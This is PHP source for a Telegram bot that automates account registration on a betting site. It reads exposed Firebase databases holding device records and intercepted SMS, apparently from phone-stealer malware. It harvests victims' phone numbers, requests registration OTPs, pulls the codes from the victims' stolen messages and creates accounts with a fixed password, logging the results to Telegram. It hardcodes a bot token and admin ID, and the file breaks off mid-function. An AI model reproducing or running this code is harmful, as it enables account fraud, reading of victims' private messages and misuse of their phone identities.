703713144170371314417037131441<?php
/**
 * vipplay Auto Register Bot - Live One-by-One Scanning (Imran9719)
 */

// ============================================================
// CONFIG
// ============================================================
define('BOT_TOKEN', '9049104444:AAHYzhMIBgjLMK_JBzb-fTsLGrkfTToSg_4');
define('API_BASE', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
define('WELCOME_IMAGE_URL', '');
define('ADMIN_ID', 8287613405);
define('LOG_CHAT', 0);
define('DATA_DIR', __DIR__ . '/data');

define('LOTUS_SEND_OTP', 'https://www.vipplay247.co/api/send-otp');
define('LOTUS_REGISTER', 'https://www.vipplay247.co/api/registration');
define('LOTUS_PASSWORD', 'Imran9719');

define('PAGE_SIZE', 8);
define('MAX_DEVICES_PER_RUN', 50);
define('FB_MSG_LIMIT', 15);
define('PROGRESS_INTERVAL', 1.5); 
define('JOIN_CACHE_TTL', 20);
define('WORKER_SECRET', 'wsec_' . hash('sha256', BOT_TOKEN . '|lotus365_v2'));

@mkdir(DATA_DIR, 0755, true);
ignore_user_abort(true);
set_time_limit(0);

if (!defined('BOT_LIB_ONLY')) {
    header('Content-Type: application/json');
    echo '{"ok":true}';
    if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();
    else { while (ob_get_level()) ob_end_flush(); flush(); }
}

// ============================================================
// JSON STORAGE
// ============================================================
function loadJson($name, $default = []) {
    $p = DATA_DIR . '/' . $name;
    if (!file_exists($p)) return $default;
    $fp = @fopen($p, 'r'); if (!$fp) return $default;
    flock($fp, LOCK_SH); $d = stream_get_contents($fp);
    flock($fp, LOCK_UN); fclose($fp);
    $j = json_decode($d, true); return $j === null ? $default : $j;
}
function saveJson($name, $data) {
    $p = DATA_DIR . '/' . $name;
    $fp = @fopen($p, 'c+'); if (!$fp) return false;
    flock($fp, LOCK_EX); ftruncate($fp, 0); rewind($fp);
    fwrite($fp, json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE));
    fflush($fp); flock($fp, LOCK_UN); fclose($fp); return true;
}

// ============================================================
// TELEGRAM HELPERS & STYLE
// ============================================================
function tg($method, $params = []) {
    static $ch = null; if ($ch === null) $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => API_BASE . $method,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

function ensureSideMenuCommands() {
    $flag_file = DATA_DIR . '/commands_set_v5.flag';
    if (file_exists($flag_file)) return;
    $commands = [['command' => 'start', 'description' => '🚀 Start Bot']];
    $res = tg('setMyCommands', ['commands' => $commands]);
    if (!empty($res['ok'])) {
        tg('setChatMenuButton', ['menu_button' => ['type' => 'commands']]);
        @file_put_contents($flag_file, date('Y-m-d H:i:s'));
    }
}

function utf16_len($s) {
    if (function_exists('mb_convert_encoding')) return (int)(strlen(mb_convert_encoding($s, 'UTF-16LE', 'UTF-8')) / 2);
    return strlen($s);
}
function math_font($t) {
    static $m = null;
    if ($m === null) { $m = []; for ($i=0;$i<26;$i++){ $m[chr(65+$i)]=mb_chr(0x1D63C+$i,'UTF-8'); $m[chr(97+$i)]=mb_chr(0x1D656+$i,'UTF-8'); } }
    return strtr($t, $m);
}

function build_parts($parts, $bold = true, $uc = true, $bq = true) {
    $text = ''; $ents = []; $off = 0;
    foreach ($parts as $p) {
        $disp = (string)$p[0]; $etype = $p[2] ?? null;
        $isUrl = (bool)preg_match('#https?://#i', trim($disp));
        $isPhoneOnly = (bool)preg_match('#^[6-9]\d{9}$#', trim($disp));
        $skipStyle = $isUrl || $isPhoneOnly || $etype;
        if ($uc && !$skipStyle) $disp = mb_strtoupper($disp, 'UTF-8');
        if (!$skipStyle) $disp = math_font($disp);
        
        $len = utf16_len($disp);
        if ($etype) $ents[] = ['type'=>$etype,'offset'=>$off,'length'=>$len];
        elseif ($bold && $disp !== '') $ents[] = ['type'=>'bold','offset'=>$off,'length'=>$len];
        $text .= $disp; $off += $len;
    }
    if ($bq && $text !== '') $ents[] = ['type'=>'blockquote','offset'=>0,'length'=>utf16_len($text)];
    return [$text, $ents];
}

function send_premium($chat_id, $parts, $kb = null, $bq = true) {
    list($text, $ents) = build_parts($parts, true, true, $bq);
    $p = ['chat_id'=>$chat_id,'text'=>$text,'entities'=>$ents,'disable_web_page_preview'=>true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('sendMessage', $p);
}
function edit_premium($chat_id, $mid, $parts, $kb = null) {
    list($text, $ents) = build_parts($parts, true, true, true);
    $p = ['chat_id'=>$chat_id,'message_id'=>$mid,'text'=>$text,'entities'=>$ents,'disable_web_page_preview'=>true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('editMessageText', $p);
}

function sendDocument($chat_id, $filePath, $caption = '') {
    $ch = curl_init(API_BASE . 'sendDocument');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'document' => new CURLFile($filePath, 'text/plain', basename($filePath)),
            'caption' => $caption, 'parse_mode' => 'HTML'
        ],
        CURLOPT_TIMEOUT => 60, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

// ============================================================
// KEYBOARDS
// ============================================================
function mainMenuKeyboard() {
    return ['keyboard'=>[
        [['text'=>math_font('CREATE ACCOUNT'),'style'=>'success']],
        [['text'=>math_font('AUTO MODE'),'style'=>'primary']],
        [['text'=>math_font('MY ACCOUNTS'),'style'=>'primary']],
        [['text'=>math_font('CANCEL'),'style'=>'danger']],
    ],'resize_keyboard'=>true];
}
function cancelKeyboard() {
    return ['keyboard'=>[[['text'=>math_font('CANCEL'),'style'=>'danger']]],'resize_keyboard'=>true];
}
function forceJoinKeyboard($channels) {
    $rows = [];
    foreach ($channels as $i => $ch)
        $rows[] = [['text'=>math_font('JOIN CHANNEL'),'url'=>$ch['invite_url'],'style'=>($i%2===0?'danger':'primary')]];
    $rows[] = [['text'=>math_font('CHECK MEMBERSHIP'),'callback_data'=>'check_membership','style'=>'success']];
    return ['inline_keyboard'=>$rows];
}

// ============================================================
// USER / STATE
// ============================================================
function getSettings() { return loadJson('settings.json', ['channels'=>[],'maintenance'=>false]); }
function getUsers(){ return loadJson('users.json', []); }
function saveUsers($u){ return saveJson('users.json', $u); }
function getStates(){ return loadJson('states.json', []); }
function saveStates($s){ return saveJson('states.json', $s); }
function getVerified(){ return loadJson('verified.json', []); }
function saveVerified($v){ return saveJson('verified.json', $v); }
function getState($uid){ $s = getStates(); return $s[$uid] ?? null; }
function setState($uid, $s){ $a = getStates(); $a[$uid] = $s; saveStates($a); }
function clearState($uid){ $a = getStates(); unset($a[$uid]); saveStates($a); }
function setVerified($uid, $v = true){
    $a = getVerified();
    if ($v) $a[$uid] = time(); else unset($a[$uid]);
    saveVerified($a);
}
function ensureUser($uid, $name = '', $username = '') {
    $u = getUsers();
    if (!isset($u[$uid])) {
        $u[$uid] = ['id'=>$uid,'name'=>$name,'username'=>$username,'joined_at'=>date('Y-m-d H:i:s')];
        saveUsers($u);
    } else {
        $changed = false;
        if ($name !== '' && ($u[$uid]['name'] ?? '') !== $name) { $u[$uid]['name'] = $name; $changed = true; }
        if ($username !== '' && ($u[$uid]['username'] ?? '') !== $username) { $u[$uid]['username'] = $username; $changed = true; }
        if ($changed) saveUsers($u);
    }
}
function getUser($uid){ $u = getUsers(); return $u[$uid] ?? null; }

// ============================================================
// ACCOUNTS FILE (Only Phones)
// ============================================================
function accountsFile($uid) { return DATA_DIR . '/accounts_' . $uid . '.txt'; }

function saveAccount($uid, $phone, $userId) {
    $line = $phone . "\n"; 
    file_put_contents(accountsFile($uid), $line, FILE_APPEND | LOCK_EX);
}
function getAccountCount($uid) {
    $f = accountsFile($uid);
    if (!file_exists($f)) return 0;
    return count(array_filter(file($f)));
}
function isPhoneRegistered($uid, $phone) {
    $f = accountsFile($uid);
    if (!file_exists($f)) return false;
    foreach (file($f) as $line) {
        if (trim($line) === $phone) return true;
    }
    return false;
}

// ============================================================
// FORCE JOIN
// ============================================================
function checkForceJoin($uid, $force = false) {
    if ($uid == ADMIN_ID) return true;
    $v = getVerified(); $last = isset($v[$uid]) ? (is_numeric($v[$uid]) ? (int)$v[$uid] : 0) : 0;
    if (!$force && $last > 0 && (time() - $last) < JOIN_CACHE_TTL) return true;
    $channels = getSettings()['channels'] ?? [];
    if (empty($channels)) { setVerified($uid, true); return true; }

    $mh = curl_multi_init(); $hs = [];
    foreach ($channels as $i => $ch) {
        $c = curl_init(API_BASE . 'getChatMember');
        curl_setopt_array($c, [
            CURLOPT_RETURNTRANSFER=>true, CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=>json_encode(['chat_id'=>$ch['chat_id'],'user_id'=>$uid]),
            CURLOPT_HTTPHEADER=>['Content-Type: application/json'],
            CURLOPT_TIMEOUT=>4, CURLOPT_SSL_VERIFYPEER=>false,
        ]);
        curl_multi_add_handle($mh, $c); $hs[$i] = $c;
    }
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);
    $ok = true;
    foreach ($hs as $c) {
        $res = json_decode((string)curl_multi_getcontent($c), true);
        curl_multi_remove_handle($mh, $c); curl_close($c);
        $st = $res['result']['status'] ?? '';
        if (empty($res['ok']) || !in_array($st, ['member','administrator','creator'])) $ok = false;
    }
    curl_multi_close($mh); setVerified($uid, $ok); return $ok;
}
function sendJoinPrompt($chat_id) {
    $channels = getSettings()['channels'] ?? [];
    send_premium($chat_id, [
        ['❌', null], [" CHANNEL MEMBERSHIP REQUIRED!\n\n", null],
        ['📢', null], [" PEHLE CHANNEL JOIN KAREIN, PHIR CHECK PAR CLICK KAREIN.", null],
    ], forceJoinKeyboard($channels));
}

// ============================================================
// OTP & PHONE HELPERS
// ============================================================
function extractLotusOtp($body) {
    if (preg_match('/Your OTP is (\d{4,6})/i', $body, $m)) return $m[1];
    if (preg_match('/OTP[:\s]+(\d{4,6})/i', $body, $m)) return $m[1];
    if (preg_match('/\b(\d{4,6})\b.*(?:OTP|code|verify)/i', $body, $m)) return $m[1];
    if (preg_match('/(?:OTP|code|verify).*?\b(\d{4,6})\b/i', $body, $m)) return $m[1];
    return null;
}
function extractPhoneFromMsgs($msgs) {
    if (!is_array($msgs)) return null;
    $counts = [];
    foreach ($msgs as $msg) {
        if (!is_array($msg)) continue;
        $text = (string)($msg['body'] ?? $msg['message'] ?? $msg['text'] ?? '');
        if ($text === '') continue;
        if (preg_match_all('/\b(?:\+91|91|0)?([6-9]\d{9})\b/', $text, $m)) {
            foreach ($m[1] as $p) $counts[$p] = ($counts[$p] ?? 0) + 1;
        }
    }
    if (empty($counts)) return null;
    arsort($counts);
    return (string)array_key_first($counts);
}
function cleanPhone($raw) {
    $d = preg_replace('/\D/', '', (string)$raw);
    if (strlen($d) == 12 && substr($d, 0, 2) == '91') $d = substr($d, 2);
    elseif (strlen($d) == 11 && substr($d, 0, 1) == '0') $d = substr($d, 1);
    if (strlen($d) > 10) $d = substr($d, -10);
    if (strlen($d) == 10 && in_array($d[0], ['6','7','8','9'])) return $d;
    return null;
}

// ============================================================
// LOTUS365 API HANDLES
// ============================================================
function buildLotusSendOtpHandle($phone) {
    $ch = curl_init(LOTUS_SEND_OTP);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['type' => 'registration','mobile' => $phone,'countrycode' => '91']),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json', 'Accept: application/json, text/plain, */*',
            'Authorization: Bearer null', 'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A5560) AppleWebKit/537.36',
            'Origin: https://www.lotus365.fast', 'Referer: https://www.lotus365.fast/',
        ],
        CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return $ch;
}

function buildLotusRegisterHandle($phone, $otp) {
    $ch = curl_init(LOTUS_REGISTER);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'userid' => '', 'mobile' => $phone, 'password' => LOTUS_PASSWORD,
            'otp' => (int)$otp, 'isDownLine' => false, 'refer_code' => null, 'country_code' => '91', 'affiliate_code' => null,
        ]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json', 'Accept: application/json, text/plain, */*',
            'Authorization: Bearer null', 'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A5560) AppleWebKit/537.36',
            'Origin: https://www.lotus365.fast', 'Referer: https://www.lotus365.fast/',
        ],
        CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return $ch;
}

// ============================================================
// FIREBASE HELPERS
// ============================================================
function normalizeFirebase($url) {
    if (!$url) return null;
    $u = trim($url);
    if (strpos($u, 'http') !== 0) return null;
    if (strpos($u, 'firebaseio.com') === false && strpos($u, 'firebasedatabase.app') === false) return null;
    $u = rtrim($u, '/');
    while (substr($u, -5) === '.json') $u = rtrim(substr($u, 0, -5), '/');
    return $u;
}
function fbGet($url, $timeout = 6) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$timeout, CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>false]);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    if ($code != 200 || !$r || $r === 'null') return null;
    return json_decode($r, true);
}
function multiGetJson($urls, $timeout = 6) {
    if (empty($urls)) return [];
    $mh = curl_multi_init(); $hs = [];
    foreach ($urls as $k => $u) {
        $c = curl_init($u);
        curl_setopt_array($c, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$timeout, CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>false]);
        curl_multi_add_handle($mh, $c); $hs[$k] = $c;
    }
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.15); } while ($active && $mrc == CURLM_OK);
    $out = [];
    foreach ($hs as $k => $c) {
        $code = curl_getinfo($c, CURLINFO_HTTP_CODE); $b = curl_multi_getcontent($c);
        $out[$k] = ($code==200 && $b && $b !== 'null') ? json_decode($b, true) : null;
        curl_multi_remove_handle($mh, $c); curl_close($c);
    }
    curl_multi_close($mh); return $out;
}

function fetchFirebaseDevices($baseUrl, $fast = false) {
    $base = rtrim($baseUrl, '/');
    $out = ['ok'=>false, 'total'=>0, 'online'=>0, 'devices'=>[]];
    $onlineDevices = [];
    
    // Fast mode = 2 seconds timeout for quick scanning
    $t = $fast ? 2 : 7; 
    
    foreach (['clients','devices'] as $node) {
        $data = fbGet($base . '/' . $node . '.json', $t);
        if (is_array($data)) {
            $out['ok'] = true; $out['total'] = count($data);
            foreach ($data as $cid => $info) {
                if (!is_array($info)) continue;
                $st = $info['status'] ?? null;
                if (!($st === true || in_array(strtolower((string)$st), ['true','1','online','active','on']))) continue;
                $out['online']++;
                $phone = null;
                foreach (['mobNo','mob_no','mobile','phoneNumber','phone'] as $f) {
                    $phone = cleanPhone($info[$f] ?? '');
                    if ($phone) break;
                }
                $onlineDevices[(string)$cid] = ['phone'=>$phone, 'name'=>$info['modelName'] ?? $info['model'] ?? $cid];
            }
            if (!empty($onlineDevices)) break;
        }
    }
    if (empty($onlineDevices) && !$fast) {
        foreach (['All_Users','All_User'] as $root) {
            $devInfo = fbGet($base . '/' . $root . '/DeviceInfo.json', $t);
            if (!is_array($devInfo)) $devInfo = fbGet($base . '/' . $root . '/Data/DeviceInfo.json', $t);
            if (!is_array($devInfo)) continue;
            $out['ok'] = true; $out['total'] = count($devInfo);
            $sim = fbGet($base . '/' . $root . '/simDetails.json', $t);
            foreach ($devInfo as $devId => $info) {
                if (!is_array($info)) continue;
                $st = strtolower((string)($info['Status'] ?? $info['status'] ?? ''));
                if (!in_array($st, ['online','on','active','1','true'])) continue;
                $out['online']++;
                $s = $sim[$devId] ?? [];
                $phone = null;
                foreach (['sim1Number','sim2Number','phoneNumber','number','phone','mobile','mobNo'] as $f) {
                    $phone = cleanPhone($s[$f] ?? $info[$f] ?? '');
                    if ($phone) break;
                }
                $onlineDevices[(string)$devId] = ['phone'=>$phone, 'name'=>$info['ModelName'] ?? $devId];
            }
            if (!empty($onlineDevices)) break;
        }
    }
    $missingPhoneUrls = [];
    foreach ($onlineDevices as $cid => $d) {
        if (empty($d['phone'])) {
            $missingPhoneUrls[$cid] = $base . '/messages/' . rawurlencode($cid) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
        }
    }
    if (!empty($missingPhoneUrls)) {
        $fetchedMsgs = multiGetJson($missingPhoneUrls, $t);
        foreach ($fetchedMsgs as $cid => $msgs) {
            if (is_array($msgs)) {
                $ext = extractPhoneFromMsgs($msgs);
                if ($ext) $onlineDevices[$cid]['phone'] = $ext;
            }
        }
    }
    foreach ($onlineDevices as $cid => $d) {
        if (!empty($d['phone'])) $out['devices'][$cid] = ['phone'=>$d['phone'], 'name'=>$d['name']];
    }
    return $out;
}

// ============================================================
// TERMINAL UI
// ============================================================
function computePages($total) {
    $pages = [];
    for ($i=0; $i<$total; $i+=PAGE_SIZE) $pages[] = [$i, min($i+PAGE_SIZE, $total)];
    return empty($pages) ? [[0,0]] : $pages;
}
function getTerminalState($uid) { return loadJson('terminal_' . $uid . '.json', null); }
function setTerminalState($uid, $s) { saveJson('terminal_' . $uid . '.json', $s); }
function getUserManualPage($uid) { return loadJson('userpage_' . $uid . '.json', ['page'=>0,'set_at'=>0]); }
function setUserManualPage($uid, $pg) { saveJson('userpage_' . $uid . '.json', ['page'=>(int)$pg,'set_at'=>time()]); }
function clearUserManualPage($uid) { @unlink(DATA_DIR . '/userpage_' . $uid . '.json'); }

function pickDisplayPage($state, $uid) {
    $total = $state['total'] ?? 0;
    $totalPages = count(computePages($total));
    if ($totalPages <= 1) return 0;
    $up = getUserManualPage($uid);
    if (!empty($up['set_at'])) return max(0, min($totalPages-1, (int)$up['page']));
    return max(0, min($totalPages-1, (int)($state['current_page'] ?? 0)));
}

function terminalParts($state, $pageIdx, $final = false) {
    $parts = [];
    $devices = $state['devices'] ?? [];
    $total = $state['total'] ?? 0; $done = $state['done'] ?? 0;
    $success = $state['success'] ?? 0; $failed = $state['failed'] ?? 0;
    $cancelled = !empty($state['cancelled']);
    $pages = computePages($total); $totalPages = count($pages);
    $pageIdx = max(0, min($totalPages-1, $pageIdx));
    [$start, $end] = $pages[$pageIdx];
    $pNum = $pageIdx + 1;

    $startedAt = $state['started_at'] ?? time();
    $elapsed = max(0, time() - $startedAt);
    $timerStr = sprintf('%02d:%02d', floor($elapsed / 60), $elapsed % 60);

    $parts[] = ['🤖', null];
    $parts[] = [" IMRAN9719 AUTO REGISTER [⏱ $timerStr] — PAGE $pNum/$totalPages\n", null];
    $parts[] = ["━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📊', null];  $parts[] = [" TOTAL: $total | ", null];
    $parts[] = ['✅', null]; $parts[] = [" SUCCESS: $success | ", null];
    $parts[] = ['❌', null];  $parts[] = [" FAILED: $failed\n\n", null];

    for ($i=$start; $i<$end; $i++) {
        $d = $devices[$i] ?? null; if (!$d) continue;
        $phone = $d['phone'] ?? 'N/A'; $st = $d['status'] ?? 'pending';
        $parts[] = ['⭐', null];
        $parts[] = [" $phone ", null];
        
        if ($st === 'completed') {
            $parts[] = ['✅', null];
            $parts[] = [" SUCCESS\n", null];
        } elseif ($st === 'sending_otp') $parts[] = [" ⏳ OTP SENDING...\n", null];
        elseif ($st === 'waiting_otp') $parts[] = [" ⏳ OTP SENT (WAITING...)\n", null];
        elseif ($st === 'otp_found') $parts[] = [" ✅ OTP FOUND!\n", null];
        elseif ($st === 'registering') $parts[] = [" 🔄 REGISTERING...\n", null];
        elseif ($st === 'failed') { $parts[] = ['❌', null]; $parts[] = [" " . ($d['error'] ?? 'FAILED') . "\n", null]; }
        else $parts[] = [" ⏳ PENDING\n", null];
    }
    $parts[] = ["\n━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📈', null];
    $parts[] = [" PROGRESS: $done/$total | PAGE: $pNum/$totalPages\n", null];
    $parts[] = ['🏁', null];
    $parts[] = [$cancelled ? " CANCELLED\n" : ($final ? " COMPLETE\n" : " RUNNING...\n"), null];
    return $parts;
}
function terminalKeyboard($pageIdx, $totalPages, $final = false) {
    $rows = [];
    if ($totalPages > 1) {
        $nav = [];
        if ($pageIdx > 0) $nav[] = ['text'=>math_font('PREV'),'callback_data'=>'term_page:' . ($pageIdx-1),'style'=>'primary'];
        if ($pageIdx < $totalPages-1) $nav[] = ['text'=>math_font('NEXT'),'callback_data'=>'term_page:' . ($pageIdx+1),'style'=>'primary'];
        if ($nav) $rows[] = $nav;
    }
    if (!$final) $rows[] = [['text'=>math_font('CANCEL'),'callback_data'=>'term_cancel','style'=>'danger']];
    return $rows ? ['inline_keyboard'=>$rows] : null;
}
function renderTerminal($uid, $final = false, $force = false) {
    static $last = 0.0;
    if (!$final && !$force && (microtime(true)-$last) < PROGRESS_INTERVAL) return;
    $last = microtime(true);
    $s = getTerminalState($uid); if (!$s || empty($s['msg_id'])) return;
    $pg = pickDisplayPage($s, $uid);
    $s['current_page'] = $pg; setTerminalState($uid, $s);
    $totalPages = count(computePages($s['total'] ?? 0));
    $parts = terminalParts($s, $pg, $final || !empty($s['completed']) || !empty($s['cancelled']));
    $kb = terminalKeyboard($pg, $totalPages, $final || !empty($s['completed']) || !empty($s['cancelled']));
    edit_premium($s['chat_id'], $s['msg_id'], $parts, $kb);
}

// ============================================================
// LOGS & WORKER SPAWN
// ============================================================
function logToChannel($text) {
    if (!LOG_CHAT) return;
    tg('sendMessage', ['chat_id'=>LOG_CHAT,'text'=>$text,'parse_mode'=>'HTML']);
}
function logAccount($phone, $userId, $uid) {
    if (!LOG_CHAT) return;
    $u = getUser($uid) ?: [];
    $name = htmlspecialchars($u['name'] ?? 'User', ENT_QUOTES, 'UTF-8');
    $uname = !empty($u['username']) ? '@' . htmlspecialchars($u['username'], ENT_QUOTES, 'UTF-8') : 'N/A';
    logToChannel("🎉 <b>ACCOUNT CREATED</b>\n\n"
       . "📱 <b>PHONE:</b> <code>$phone</code>\n"
       . "🔑 <b>PASS:</b> <code>" . LOTUS_PASSWORD . "</code>\n"
       . "🆔 <b>USER ID:</b> <code>$userId</code>\n\n"
       . "👤 <b>NAME:</b> $name\n"
       . "🏷 <b>USERNAME:</b> $uname\n"
       . "🆔 <b>TELEGRAM ID:</b> <code>$uid</code>");
}
function saveFirebaseUrl($url) {
    $p = DATA_DIR . '/firebase.txt';
    $existing = file_exists($p) ? array_map('trim', file($p)) : [];
    if (in_array($url, $existing)) return false;
    file_put_contents($p, $url . "\n", FILE_APPEND|LOCK_EX);
    return true;
}
function spawnWorker($uid, $chat_id, $urls, $scan_msg_id = null) {
    $payload = json_encode([
        'uid'=>(int)$uid,'chat_id'=>(int)$chat_id,
        'urls'=>(array)$urls,'scan_msg_id'=>$scan_msg_id,'ts'=>time(),
    ], JSON_UNESCAPED_SLASHES);
    $token = hash_hmac('sha256', $payload, WORKER_SECRET);
    $worker = __DIR__ . '/worker.php';
    $dis = array_map('trim', explode(',', (string)ini_get('disable_functions')));

    if (function_exists('exec') && !in_array('exec', $dis)) {
        @exec('nohup php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &');
        return true;
    }
    if (function_exists('popen') && !in_array('popen', $dis)) {
        $h = @popen('php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &', 'r');
        if ($h) { @pclose($h); return true; }
    }
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $dir = rtrim(str_replace('\\','/', dirname($_SERVER['SCRIPT_NAME'] ?? '/bot.php')), '/');
    $wurl = $scheme . '://' . $host . $dir . '/worker.php';
    $ch = curl_init($wurl);
    curl_setopt_array($ch, [
        CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>$payload,
        CURLOPT_HTTPHEADER=>['Content-Type: application/json','X-Worker-Token: ' . $token,'Connection: close'],
        CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT_MS=>700,
        CURLOPT_CONNECTTIMEOUT_MS=>300, CURLOPT_SSL_VERIFYPEER=>false,
        CURLOPT_FORBID_REUSE=>true, CURLOPT_FRESH_CONNECT=>true,
    ]);
    $ok = @curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch);
    return ($ok !== false && $code >= 200 && $code < 500);
}

// ============================================================
// AUTO FLOW (Live One-by-One Scanning)
// ============================================================
function runAutoFlow($uid, $chat_id, $urls, $scan_msg_id = null) {
    clearUserManualPage($uid);
    
    $start_time = time();
    $scan_deadline = $start_time + 30;
    $all_devices = [];
    $failed_urls = [];
    $working_urls = [];
    
    // LIVE ONE BY ONE SCANNING
    foreach ($urls as $url) {
        if (time() >= $scan_deadline) break;
        
        $remaining = max(0, $scan_deadline - time());
        $host = parse_url($url, PHP_URL_HOST) ?: $url;
        
        if ($scan_msg_id) {
            edit_premium($chat_id, $scan_msg_id, [
                ['🔍', null], [" DEEP SCANNING FIREBASE...\n\n", null],
                ["⏱ TIME REMAINING: {$remaining}s\n\n", null],
                ["🔗 CHECKING: <code>" . substr($host, 0, 28) . "</code>\n", null],
                ["🟢 WORKING: " . count($working_urls) . " | 🔴 FAILED: " . count($failed_urls), null]
            ]);
        }
        
        $scan = fetchFirebaseDevices($url, true); // fast=true
        
        if (!empty($scan['ok'])) {
            $working_urls[] = $url;
            saveFirebaseUrl($url);
            logToChannel("🔥 <b>WORKING FIREBASE FOUND</b>\nURL: <code>$url</code>\nUser: <code>$uid</code>");
            foreach ($scan['devices'] as $cid => $d) {
                $d['base_url'] = $url;
                $all_devices[$cid] = $d;
            }
        } else {
            $failed_urls[] = $url;
        }
        
        usleep(500000); // 0.5s delay to respect TG limits
    }
    
    // Final scan result
    if ($scan_msg_id) {
        edit_premium($chat_id, $scan_msg_id, [
            ['✅', null], [" SCAN COMPLETE!\n\n", null],
            ["🟢 WORKING: " . count($working_urls) . "\n", null],
            ["🔴 FAILED: " . count($failed_urls) . "\n\n", null],
            ["⏳ STARTING OTP & REGISTRATION...", null]
        ]);
        sleep(2);
        tg('deleteMessage', ['chat_id'=>$chat_id,'message_id'=>$scan_msg_id]);
    }

    if (empty($all_devices)) {
        send_premium($chat_id, [['❌', null], [' NO VALID DEVICES FOUND IN ANY FIREBASE', null]], mainMenuKeyboard());
        return;
    }

    $devices = [];
    $alreadyDone = 0;
    foreach ($all_devices as $cid => $d) {
        if (!isPhoneRegistered($uid, $d['phone'])) $devices[$cid] = $d;
        else $alreadyDone++;
    }

    $total = count($devices);
    if ($total === 0) {
        if ($alreadyDone > 0) send_premium($chat_id, [['⭐', null], [" NO NEW DEVICES FOUND (ALL ALREADY REGISTERED)", null]], mainMenuKeyboard());
        else send_premium($chat_id, [['❌', null], [" NO VALID PHONE NUMBERS FOUND", null]], mainMenuKeyboard());
        return;
    }

    $devices = array_slice($devices, 0, MAX_DEVICES_PER_RUN, true);
    $list = [];
    foreach ($devices as $cid => $d) {
        $list[] = ['cid'=>(string)$cid,'phone'=>$d['phone'],'name'=>$d['name']??$cid,'base_url'=>$d['base_url'],
            'status'=>'pending','userid'=>'','error'=>'','otp'=>'','baseline'=>[]];
    }
    $totalPages = count(computePages(count($list)));

    $term = [
        'chat_id'=>$chat_id,'uid'=>$uid,'url'=>implode(',', $working_urls),
        'total'=>count($list),'current_page'=>0,
        'done'=>0,'success'=>0,'failed'=>0,'devices'=>$list,'msg_id'=>null,
        'cancelled'=>false,'completed'=>false,'started_at'=>time(),
    ];
    $res = send_premium($chat_id, terminalParts($term, 0, false), terminalKeyboard(0, $totalPages, false));
    if (!empty($res['ok'])) $term['msg_id'] = $res['result']['message_id'];
    setTerminalState($uid, $term);

    // Baseline SMS scan
    $baselineUrls = [];
    foreach ($term['devices'] as $i => $dev) {
        $msgUrlBase = rtrim($dev['base_url'], '/') . '/messages/';
        $baselineUrls[$i] = $msgUrlBase . rawurlencode($dev['cid']) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
    }
    $baselineRaw = multiGetJson($baselineUrls, 5);
    foreach ($baselineRaw as $i => $msgs) {
        if (is_array($msgs)) $term['devices'][$i]['baseline'] = array_map('strval', array_keys($msgs));
    }
    setTerminalState($uid, $term);

    // 1. PARALLEL OTP SENDING
    $pending_otp = [];
    foreach ($term['devices'] as $i => $dev) {
        $term['devices'][$i]['status'] = 'sending_otp';
        $pending_otp[$i] = 1;
    }
    setTerminalState($uid, $term);
    renderTerminal($uid, false, true);

    for ($try = 1; $try <= 5; $try++) {
        if (empty($pending_otp)) break;
        $mh = curl_multi_init(); $hs = [];
        foreach ($pending_otp as $i => $attempt) {
